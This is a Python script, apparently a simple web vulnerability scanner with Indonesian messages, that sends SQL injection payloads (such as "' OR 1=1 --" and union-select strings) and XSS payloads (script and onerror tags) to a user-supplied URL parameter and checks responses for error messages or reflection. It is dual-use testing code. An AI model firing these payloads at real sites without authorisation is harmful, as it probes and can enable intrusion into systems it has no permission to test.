import requests
import argparse
import logging
from urllib.parse import urljoin
from merlincolor import *
from merlinset import *
from merlinlogo import *

#logging.basicConfig(level=logging.INFO, format=LC + '[' + W + '%(asctime)s' + LC + ']' + LG + ' - ' + LC + '%(levelname)s ' + LG + '- ' + LB + '%(message)s', datefmt='%H:%M:%S')
logging.basicConfig(level=logging.INFO, format=LC + '[' + W + '%(asctime)s' + LC + ']' + LG +  ' %(message)s', datefmt='%H:%M:%S')

def get_arguments():
    parser = argparse.ArgumentParser(description=LG + "Web Vulnerability Scanner (SQLi, XSS).")
    parser.add_argument("-u", "--url", dest="target_url", help="URL target untuk dipindai (contoh: http://example.com/search.php?query=test)")
    options = parser.parse_args()
    if not options.target_url:
        parser.error(f"{danger} Harap tentukan URL target. Gunakan --help.")
    return options

def test_sql_injection(url):
    """Mencoba mendeteksi kerentanan SQL Injection dasar."""
    logging.info(f"{info} {N}- {LG}GET {N}-{LY} Menguji SQL Injection {LG}{url}")

    sqli_payloads = [
        "' OR 1=1 --",
        "\" OR 1=1 --",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "' OR 'a'='a",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1 LIMIT 1 --",
        "ORDER BY 1--",
        "union select 1,2,3--",
    ]

    for payload in sqli_payloads:
        try:
            test_url = url.split('=')[0] + '=' + payload
            response = requests.get(test_url, timeout=5)

            if any(error_msg in response.text for error_msg in ["sql syntax", "mysql_fetch_array()", "odbc message", "ORA-", "SQLSTATE"]):
                logging.warning(f"{info} {N}- {LY}request{N} - {LG}Potensi SQL Injection terdeteksi dengan payload: '{W}{payload}{LG}' di URL: {D}{test_url}{N}")
                logging.warning(f"{warning} {LG}Pesan error: {response.text[:200]}...")
                return True

        except requests.exceptions.RequestException as e:
            logging.error(f"{danger}{LR} Error HTTP saat menguji SQLi dengan payload '{W}{payload}{LR}': {W}{D}{e}{N}")
        except Exception as e:
            logging.error(f"{danger}{LR} Error umum saat menguji SQLi: {W}{e}")

    logging.warning(f"{warning} Tidak ada indikasi SQL Injection yang ditemukan.")
    return False

def test_xss(url):
    logging.info(f"{info} {N}- {LG}GET {N}-{LY} Menguji XSS {LG}{url}")
    xss_payloads = [
        "<script>alert('XSS by Djunekz!')</script>",
        "<img src=x onerror=alert('XSS by Hmei7!')>",
        "'';!--\"<XSS>=&{()}",
        "<BODY ONLOAD=alert('XSS by RedHh!')>",
        "<a href=\"javascript:alert('XSS by Hmei7!')\">Click me</a>",
    ]

    for payload in xss_payloads:
        try:
            test_url = url.split('=')[0] + '=' + payload
            response = requests.get(test_url, timeout=5)

            if payload in response.text:
                logging.warning(f"{info} {N}- {LY}request{N} - {LG}Potensi XSS terdeteksi dengan payload: '{W}{payload}{LG}' di URL: {D}{test_url}{N}")
                logging.warning(f"{warning} {LG}Payload ditemukan dalam respons.")
                return True
        except requests.exceptions.RequestException as e:
            logging.error(f"{danger}{LR} Error HTTP saat menguji XSS dengan payload '{W}{payload}{LR}': {W}{D}{e}{N}")
        except Exception as e:
            logging.error(f"{danger}{LR} Error umum saat menguji XSS: {W}{D}{e}{N}")

    logging.warning(f"{warning} Tidak ada indikasi XSS yang ditemukan.")
    return False

if __name__ == "__main__":
    print(logo)
    options = get_arguments()

    print(f"{LY}--- {LG}Web Vulnerability Scanner {LY}---")
    print(f"{C}Target URL: {LY}{D}{options.target_url}{N}")
    print("-" * 60)

    if '=' not in options.target_url:
        print(f"{error} URL target tidak mengandung parameter yang jelas{W} (misal: {LY}?param=value{W}){LR}.")
        print(f"{error} Skrip ini dirancang untuk menguji injeksi pada parameter URL.")
        print(f"{error} Lanjutkan dengan risiko Anda sendiri, atau sediakan URL dengan parameter.")

    print(LY + "\n--- " + LG + "Starting Scan SQL Injection" + LY + " ---")
    sql_vulnerable = test_sql_injection(options.target_url)
    if sql_vulnerable:
        print(sukses + " URL mungkin rentan terhadap SQL Injection!")
    else:
        print(min + " URL tampaknya tidak rentan terhadap SQL Injection.")

    print(LY + "\n--- " + LG + "Starting Scan XSS" + LY + " ---")
    xss_vulnerable = test_xss(options.target_url)
    if xss_vulnerable:
        print(sukses + " URL mungkin rentan terhadap XSS!")
    else:
        print(min + " URL tampaknya tidak rentan terhadap XSS.")

    print(LY + "\n--- " + LG + "Scanning successful" + LY + " ---")


